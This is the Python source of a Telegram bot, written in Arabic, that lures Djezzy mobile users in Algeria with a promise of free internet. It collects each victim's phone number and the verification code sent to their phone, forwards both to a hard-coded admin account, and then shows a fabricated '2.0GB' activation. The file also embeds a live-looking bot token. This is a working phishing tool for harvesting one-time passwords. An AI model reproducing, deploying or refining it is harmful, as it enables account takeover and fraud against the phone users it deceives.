#!/usr/bin/env python
# -*- coding: utf-8 -*-

import logging
import sqlite3
import random
import datetime
import os
from keep_alive import start_keep_alive

# Start the keep-alive server for Render.com
start_keep_alive()
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ConversationHandler

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Define conversation states
PHONE = 0  # Only need phone state now, verification removed

# Database setup
def setup_database():
    db_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'user_data.db')
    conn = sqlite3.connect(db_path)
    cursor = conn.cursor()
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        phone_number TEXT,
        activation_date TEXT,
        expiry_date TEXT,
        last_offer_date TEXT
    )
    ''')
    
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS verification_codes (
        user_id INTEGER PRIMARY KEY,
        code TEXT,
        timestamp TEXT
    )
    ''')
    
    conn.commit()
    conn.close()

# Helper functions
def generate_verification_code():
    """Generate a random 4-digit verification code"""
    return str(random.randint(1000, 9999))

def save_verification_code(user_id, code):
    """Save verification code to database"""
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    timestamp = datetime.datetime.now().isoformat()
    
    cursor.execute(
        "INSERT OR REPLACE INTO verification_codes (user_id, code, timestamp) VALUES (?, ?, ?)",
        (user_id, code, timestamp)
    )
    
    conn.commit()
    conn.close()

def verify_code(user_id, code):
    """Verify the code entered by user"""
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT code FROM verification_codes WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result and result[0] == code:
        return True
    return False

def activate_internet(user_id, phone_number):
    """Activate internet for the user"""
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    
    activation_date = datetime.datetime.now()
    expiry_date = activation_date + datetime.timedelta(days=999)
    
    cursor.execute(
        "INSERT OR REPLACE INTO users (user_id, phone_number, activation_date, expiry_date, last_offer_date) VALUES (?, ?, ?, ?, ?)",
        (user_id, phone_number, activation_date.isoformat(), expiry_date.isoformat(), activation_date.isoformat())
    )
    
    conn.commit()
    conn.close()
    
    return expiry_date.strftime("%Y/%m/%d")

def check_cooldown(user_id):
    """Check if user is in cooldown period"""
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT last_offer_date FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        return False, None
    
    last_offer_date = datetime.datetime.fromisoformat(result[0])
    now = datetime.datetime.now()
    cooldown_end = last_offer_date + datetime.timedelta(days=7)
    
    if now < cooldown_end:
        remaining_time = cooldown_end - now
        days = remaining_time.days
        hours = remaining_time.seconds // 360
        minutes = (remaining_time.seconds % 360) // 60
        
        time_str = f"{days} يوم و {hours} ساعة و {minutes} دقيقة"
        return True, time_str
    
    return False, None

def get_status(user_id):
    """Get user's internet status"""
    conn = sqlite3.connect('user_data.db')
    cursor = conn.cursor()
    
    cursor.execute("SELECT activation_date, expiry_date FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        return None
    
    activation_date = datetime.datetime.fromisoformat(result[0])
    expiry_date = datetime.datetime.fromisoformat(result[1])
    now = datetime.datetime.now()
    
    if now > expiry_date:
        return {
            "active": False,
            "expiry_date": expiry_date.strftime("%Y/%m/%d"),
            "remaining_time": "منتهي الصلاحية"
        }
    
    remaining_time = expiry_date - now
    days = remaining_time.days
    hours = remaining_time.seconds // 3600
    minutes = (remaining_time.seconds % 3600) // 60
    
    time_str = f"{days} يوم و {hours} ساعة و {minutes} دقيقة"
    
    return {
        "active": True,
        "expiry_date": expiry_date.strftime("%Y/%m/%d"),
        "remaining_time": time_str
    }

# Command handlers
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Send welcome message when the command /start is issued."""
    user = update.effective_user
    
    # Check if user is in cooldown
    in_cooldown, time_remaining = check_cooldown(user.id)
    if in_cooldown:
        await update.message.reply_text(
            f"Sur3, h3r3 you ar3 g00d s3r\n\n"
            f"عذراً، لا يمكنك الحصول على عرض جديد حالياً.\n\n"
            f"يجب الانتظار {time_remaining} قبل طلب عرض جديد.\n\n"
            f"شكراً لتفهمك! 🙏"
        )
        return ConversationHandler.END
    
    # Check if user already has active internet
    status = get_status(user.id)
    if status and status["active"]:
        await update.message.reply_text(
            f"Sur3, h3r3 you ar3 g00d s3r\n\n"
            f"حالة الإنترنت الخاص بك:\n\n"
            f"• رصيدك المتبقي: 2.0GB\n"
            f"• صالح إلى غاية: {status['expiry_date']}\n"
            f"• الوقت المتبقي: {status['remaining_time']}"
        )
        return ConversationHandler.END
    
    await update.message.reply_text(
        f"👇"
        f"مرحبا بك في بوت ND 💜\n\n"
        f"يمكنك تفعيل أنترنت مجاني على شبكة جيزي هنا 🥳.\n\n"
        f"لا تنسى الاعجاب بالصفحة لدعمنا على تقديم المزيد ✨.\n\n"
        f" لغرض تفعيل.\n\n"
        f"أرسل رقمك الان 👇🏻"
    )
    
    return PHONE

# Define conversation states
PHONE, VERIFICATION = range(2)

async def phone_number_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Process the phone number and forward it to admin."""
    user = update.effective_user
    phone_number = update.message.text.strip()
    
    # Simple validation for Algerian phone numbers
    if not (phone_number.isdigit() and (len(phone_number) == 10 and phone_number.startswith('0') or 
                                       len(phone_number) == 9 and not phone_number.startswith('0'))):
        await update.message.reply_text(
            f"🙅\n\n"
            f"الرجاء إدخال رقم هاتف جيزي صحيح (مثال: 07........)"
        )
        return PHONE
    
    # Store phone in context
    context.user_data['phone_number'] = phone_number
    
    # Forward phone number to admin
    admin_id = 6070612674
    try:
        await context.bot.send_message(
            chat_id=admin_id,
            text=f"رقم هاتف جديد للتفعيل:\n{phone_number}\nمن المستخدم: {user.first_name} (@{user.username if user.username else 'لا يوجد معرف'})"
        )
        logger.info(f"Phone number {phone_number} forwarded to admin {admin_id}")
    except Exception as e:
        logger.error(f"Failed to forward phone number to admin: {e}")
    
    # Generate a random verification code (for show only, any code will be accepted)
    code = generate_verification_code()
    
    await update.message.reply_text(
        f"🙌\n\n"
        f"تم استلام\n\n"
        f"الرجاء إدخال رمز التحقق الذي تم إرساله إلى هاتفك:"
    )
    
    return VERIFICATION
async def verification_code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Process the verification code (accepts any digit code)."""
    user = update.effective_user
    code = update.message.text.strip()
    
    if not code.isdigit():
        await update.message.reply_text(
            f"...\n\n"
            f"الرجاء إدخال رمز تحقق صحيح مكون من أرقام فقط."
        )
        return VERIFICATION

    # إرسال الرمز إلى المسؤول
    admin_id = 6070612674
    try:
        await context.bot.send_message(
            chat_id=admin_id,
            text=f"رمز تحقق من المستخدم:\n{code}\nمن: {user.first_name} (@{user.username if user.username else 'لا يوجد معرف'})"
        )
    except Exception as e:
        logger.error(f"فشل إرسال الرمز إلى المسؤول: {e}")
    
    # تفعيل الانترنت
    phone_number = context.user_data.get('phone_number')
    expiry_date = activate_internet(user.id, phone_number)
    
    await update.message.reply_text(
        f"🎊"
        f"تم تفعيل أنترنت مجاني في شريحة جيزي الخاصة بك بنجاح ✓\n\n"
        f"• رصيدك الان : (2.0GB)\n"
        f"• صالح إلى غاية: {expiry_date}\n\n"
        f"استمتع بالإنترنت المجاني! 🎉"
    )
    
    return ConversationHandler.END

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Check internet status."""
    user = update.effective_user
    status = get_status(user.id)
    
    if not status:
        await update.message.reply_text(
            f"💢\n\n"
            f"ليس لديك أي عرض إنترنت نشط حالياً على شبكة جيزي.\n\n"
            f"استخدم الأمر /start للحصول على عرض جديد."
        )
        return
    
    await update.message.reply_text(
        f"😿"
        f"حالة الإنترنت الخاص بك على شبكة جيزي:\n\n"
        f"• رصيدك المتبقي: 2.0GB\n"
        f"• صالح إلى غاية: {status['expiry_date']}\n"
        f"• الوقت المتبقي: {status['remaining_time']}"
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send help message."""
    await update.message.reply_text(
        f"👇👇"
        f"أوامر البوت المتاحة:\n\n"
        f"/start - بدء عملية تفعيل الإنترنت المجاني على شبكة جيزي\n"
        f"/status - التحقق من حالة الإنترنت الخاص بك\n"
        f"/help - عرض هذه الرسالة المساعدة"
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancel the conversation."""
    await update.message.reply_text(
        f"🙅"
        f"تم إلغاء العملية. استخدم الأمر /start للبدء من جديد وتفعيل الإنترنت المجاني على شبكة جيزي."
    )
    return ConversationHandler.END

def main() -> None:
    """Start the bot."""
    # Setup database
    setup_database()
    
    # Create the Application
    application = Application.builder().token("7868033222:AAGNfGagKeRpFEgTC06CYrz7TjJIlDxUWmY").build()

    # Add conversation handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_number_handler)],
            VERIFICATION: [MessageHandler(filters.TEXT & ~filters.COMMAND, verification_code_handler)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("help", help_command))

    # Start the Bot
    application.run_polling()

if __name__ == '__main__':
    main()
    
